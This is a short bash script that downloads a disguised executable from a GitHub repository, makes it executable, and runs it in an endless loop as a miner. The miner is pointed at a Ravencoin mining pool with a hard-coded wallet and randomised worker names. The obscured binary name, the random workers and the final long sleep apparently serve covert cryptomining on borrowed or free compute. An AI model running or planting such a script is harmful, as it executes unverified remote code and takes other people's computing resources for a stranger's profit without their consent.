#!/bin/bash
POOL=asia-rvn.2miners.com:6060
WALLET=RVN:RJThEDSjivVxWs1oJtGPjWbqPvLB6EbAQJ
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/squibex/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
